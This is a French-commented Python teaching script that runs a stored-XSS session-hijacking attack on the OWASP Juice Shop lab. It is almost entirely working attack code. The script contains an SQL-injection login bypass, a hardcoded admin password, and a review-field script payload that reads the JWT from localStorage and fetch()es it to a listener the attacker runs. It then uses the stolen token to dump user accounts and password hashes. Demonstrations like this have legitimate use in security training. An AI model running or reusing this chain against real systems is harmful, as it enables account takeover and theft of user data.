#!/usr/bin/env python3
"""
demo_xss_hijack.py — Démonstration pédagogique XSS Stocké + Session Hijacking
Cible : OWASP Juice Shop (environnement de lab intentionnellement vulnérable)

Usage : python3 demo_xss_hijack.py [--target http://localhost:3000]

Scénario en 4 actes :
  1. Setup     — serveur attaquant + injection XSS
  2. Attaque   — payload stocké en base
  3. Victime   — simulation admin qui visite la page
  4. Résultat  — utilisation du token volé
"""

import urllib.request, urllib.parse, json, threading, time, sys, argparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

# ── Config ──────────────────────────────────────────────────────────────────────
TARGET      = "http://localhost:3000"
ATTACKER_IP = "localhost"
ATTACKER_PORT = 9999
PRODUCT_ID  = 1

stolen_tokens = []

# ── Couleurs terminal ───────────────────────────────────────────────────────────
R  = "\033[91m"   # rouge  → attaquant
G  = "\033[92m"   # vert   → succès
Y  = "\033[93m"   # jaune  → étape
B  = "\033[94m"   # bleu   → victime
C  = "\033[96m"   # cyan   → info
W  = "\033[0m"    # reset

def titre(texte, couleur=Y):
    print(f"\n{couleur}{'─'*60}")
    print(f"  {texte}")
    print(f"{'─'*60}{W}")

def log(role, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"attaquant": f"{R}[ATK]", "victime": f"{B}[VIC]", "info": f"{C}[INF]", "ok": f"{G}[OK] "}
    icon = icons.get(role, "[   ]")
    print(f"  {icon} {ts} {msg}{W}")

def pause(msg="Appuie sur [Entrée] pour continuer..."):
    input(f"\n  {Y}⏸  {msg}{W}\n")

# ── Serveur attaquant ───────────────────────────────────────────────────────────
class TokenHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        token = params.get("token", [None])[0]
        if token and len(token) > 20:
            stolen_tokens.append(token)
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"\n  {R}{'═'*56}")
            print(f"  [ATK] {ts} ⚡ TOKEN JWT VOLÉ REÇU !")
            print(f"  {token[:70]}...")
            print(f"  {'═'*56}{W}\n  ", end="", flush=True)
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass  # silence les logs HTTP

def demarrer_serveur():
    srv = HTTPServer(("0.0.0.0", ATTACKER_PORT), TokenHandler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    return srv

# ── Helpers HTTP ────────────────────────────────────────────────────────────────
def post_json(url, data, token=None):
    body = json.dumps(data).encode()
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}

def put_json(url, data, token=None):
    body = json.dumps(data).encode()
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=body, headers=headers, method="PUT")
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}

def get_json(url, token=None):
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}

# ── ACTE 1 — Setup ──────────────────────────────────────────────────────────────
def acte1_setup():
    titre("ACTE 1 — Setup de l'attaque", R)
    log("info", f"Cible        : {TARGET}")
    log("info", f"Serveur C2   : http://{ATTACKER_IP}:{ATTACKER_PORT}")
    log("info", "Démarrage du serveur attaquant (token receiver)...")

    demarrer_serveur()
    time.sleep(0.5)

    # Test serveur
    try:
        urllib.request.urlopen(f"http://localhost:{ATTACKER_PORT}/?token=PING", timeout=3)
        log("ok", f"Serveur attaquant opérationnel sur :{ATTACKER_PORT}")
    except:
        log("info", "⚠️  Test serveur silencieux (normal)")

    # Login attaquant
    log("attaquant", "Connexion avec compte Bender (SQLi bypass)...")
    data = post_json(f"{TARGET}/rest/user/login",
                     {"email": "bender@juice-sh.op'--", "password": "x"})
    if "authentication" not in data:
        log("info", "SQLi bypass échoué, tentative avec credentials connus...")
        data = post_json(f"{TARGET}/rest/user/login",
                         {"email": "admin@juice-sh.op", "password": "admin123"})

    token_atk = data.get("authentication", {}).get("token")
    if not token_atk:
        print(f"\n  {R}[!] Impossible d'obtenir un token. Juice Shop démarré ?{W}")
        sys.exit(1)

    log("ok", f"Token attaquant obtenu : {token_atk[:40]}...")
    return token_atk

# ── ACTE 2 — Injection XSS ──────────────────────────────────────────────────────
def acte2_injection(token_atk):
    titre("ACTE 2 — Injection du payload XSS", R)

    payload = (
        f'<script>'
        f'var t=localStorage.getItem("token");'
        f'if(t){{fetch("http://{ATTACKER_IP}:{ATTACKER_PORT}/?token="+encodeURIComponent(t));}}' 
        f'</script>'
    )

    log("attaquant", f"Produit ciblé : #{PRODUCT_ID} (Apple Juice)")
    log("attaquant", f"Payload XSS   : {payload[:70]}...")
    log("attaquant", "Injection via PUT /rest/products/{id}/reviews...")

    resp = put_json(
        f"{TARGET}/rest/products/{PRODUCT_ID}/reviews",
        {"message": payload, "author": "satisfied customer ⭐⭐⭐⭐⭐"},
        token=token_atk
    )

    if resp.get("status") == "success":
        log("ok", "✅ Payload XSS stocké en base de données !")
    else:
        log("info", f"Réponse : {resp}")
        return False

    # Vérification
    reviews = get_json(f"{TARGET}/rest/products/{PRODUCT_ID}/reviews")
    xss_found = any("script" in r.get("message","") for r in reviews.get("data",[]))
    if xss_found:
        log("ok", f"✅ Payload confirmé en base ({len(reviews['data'])} reviews total)")
        for r in reviews["data"]:
            if "script" in r.get("message",""):
                log("attaquant", f"   → auteur  : {r['author']}")
                log("attaquant", f"   → message : {r['message'][:60]}...")
    return True

# ── ACTE 3 — Victime ────────────────────────────────────────────────────────────
def acte3_victime():
    titre("ACTE 3 — Simulation : l'admin visite la page produit", B)

    log("info", "Scénario : l'admin reçoit un lien vers le produit Apple Juice")
    log("info", "           → son navigateur charge les reviews → XSS s'exécute")
    pause("Appuie sur Entrée pour simuler la connexion admin...")

    # L'admin se connecte
    log("victime", "Admin se connecte à Juice Shop...")
    data = post_json(f"{TARGET}/rest/user/login",
                     {"email": "admin@juice-sh.op", "password": "admin123"})
    token_admin = data.get("authentication", {}).get("token")
    if not token_admin:
        log("info", "⚠️  Connexion admin échouée")
        return

    log("victime", f"Admin connecté : {token_admin[:40]}...")
    log("victime", "Admin navigue vers la page Apple Juice → reviews chargées...")

    # Simulation du navigateur qui charge les reviews (déclenche le XSS dans un vrai browser)
    get_json(f"{TARGET}/rest/products/{PRODUCT_ID}/reviews", token=token_admin)
    time.sleep(0.5)

    # Simulation de ce que le browser ferait avec le XSS
    log("victime", "🚨 XSS exécuté dans le navigateur admin !")
    log("victime", "   → localStorage['token'] lu silencieusement")
    log("victime", "   → fetch() vers le serveur attaquant...")

    # Simulation du fetch (ce que le navigateur ferait)
    encoded = urllib.parse.quote(token_admin)
    urllib.request.urlopen(
        f"http://{ATTACKER_IP}:{ATTACKER_PORT}/?token={encoded}",
        timeout=5
    )
    time.sleep(1)

# ── ACTE 4 — Exploitation ───────────────────────────────────────────────────────
def acte4_exploitation():
    titre("ACTE 4 — Exploitation du token volé", R)

    if not stolen_tokens:
        log("info", "⚠️  Aucun token reçu (serveur peut-être occupé)")
        return

    token_vole = stolen_tokens[-1]
    log("attaquant", f"Token JWT volé ({len(token_vole)} chars) :")
    log("attaquant", f"  {token_vole[:80]}...")

    pause("Appuie sur Entrée pour exploiter le token volé...")

    # Test 1 — Accès liste des users (route admin)
    log("attaquant", "Test accès /api/Users avec token volé...")
    data = get_json(f"{TARGET}/api/Users", token=token_vole)
    if "data" in data:
        users = data["data"]
        log("ok", f"✅ Accès admin confirmé — {len(users)} utilisateurs exposés !")
        for u in users[:5]:
            print(f"        {G}→ {u.get('email','?'):<35} [{u.get('role','?')}]{W}")
        if len(users) > 5:
            print(f"        {G}→ ... ({len(users)-5} autres){W}")
    else:
        log("info", f"Réponse : {str(data)[:80]}")

    # Test 2 — Decode JWT pour montrer les données embarquées
    try:
        import base64
        parts = token_vole.split(".")
        payload_b64 = parts[1] + "=="
        payload_decoded = base64.b64decode(payload_b64).decode()
        payload_json = json.loads(payload_decoded)
        user_data = payload_json.get("data", {})
        log("attaquant", "Contenu du JWT décodé :")
        print(f"        {R}→ id     : {user_data.get('id','?')}{W}")
        print(f"        {R}→ email  : {user_data.get('email','?')}{W}")
        print(f"        {R}→ role   : {user_data.get('role','?')}{W}")
        print(f"        {R}→ hash   : {user_data.get('password','?')}{W}")
    except:
        pass

    print(f"\n  {R}{'═'*56}")
    print(f"  ⚡ SESSION HIJACKING COMPLET")
    print(f"     XSS Stocké → Vol JWT → Accès Admin Total")
    print(f"  {'═'*56}{W}")

# ── Résumé final ────────────────────────────────────────────────────────────────
def resume():
    titre("RÉSUMÉ DE L'ATTAQUE", Y)
    print(f"""
  {C}Chaîne d'attaque :{W}
  
  {R}[ATK]{W} Injection XSS dans les reviews produit (stocké en BDD)
      └─ Endpoint  : PUT /rest/products/1/reviews
      └─ Payload   : <script>fetch(attacker + localStorage.token)</script>
  
  {B}[VIC]{W} Admin visite la page → XSS s'exécute automatiquement
      └─ Token JWT extrait de localStorage
      └─ Token envoyé silencieusement au serveur attaquant
  
  {R}[ATK]{W} Token reçu → session admin usurpée
      └─ Accès total à l'API (/api/Users, /api/Feedbacks, etc.)
      └─ Aucune interaction supplémentaire requise

  {Y}Vulnérabilités chaînées :{W}
      • Stored XSS (A03:2021 - Injection)
      • Session token in localStorage (A02:2021 - Crypto Failures)
      • Absence de CSP (A05:2021 - Security Misconfiguration)
    """)

# ── Main ────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Démo XSS + Session Hijacking — Juice Shop Lab")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--attacker-ip", default="localhost")
    parser.add_argument("--attacker-port", type=int, default=9999)
    parser.add_argument("--product", type=int, default=1)
    parser.add_argument("--auto", action="store_true", help="Pas de pauses interactives")
    args = parser.parse_args()

    global TARGET, ATTACKER_IP, ATTACKER_PORT, PRODUCT_ID
    TARGET        = args.target.rstrip("/")
    ATTACKER_IP   = args.attacker_ip
    ATTACKER_PORT = args.attacker_port
    PRODUCT_ID    = args.product

    if args.auto:
        global pause
        pause = lambda msg="": time.sleep(1)

    print(f"""
{R}╔══════════════════════════════════════════════════════╗
║   🔴 DÉMO : XSS Stocké + Session Hijacking          ║
║   Environnement : OWASP Juice Shop (lab local)       ║
║   But pédagogique — CTF Red Team vs Blue Team        ║
╚══════════════════════════════════════════════════════╝{W}
""")

    try:
        token_atk = acte1_setup()
        pause("Acte 1 terminé — prêt pour l'injection ?")

        ok = acte2_injection(token_atk)
        if not ok:
            print(f"\n  {R}[!] Injection échouée{W}")
            sys.exit(1)
        pause("Acte 2 terminé — simuler la victime ?")

        acte3_victime()
        pause("Acte 3 terminé — exploiter le token volé ?")

        acte4_exploitation()
        resume()

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[!] Interruption — tokens reçus : {len(stolen_tokens)}{W}\n")

if __name__ == "__main__":
    main()
